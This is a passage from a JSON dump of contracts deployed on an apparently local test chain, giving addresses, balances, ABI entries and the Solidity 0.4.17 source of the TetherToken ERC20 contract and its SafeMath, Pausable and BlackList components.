@param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99748409580000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0xe982E462b094850F12AF94d21D470e21bE9D0E9C",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              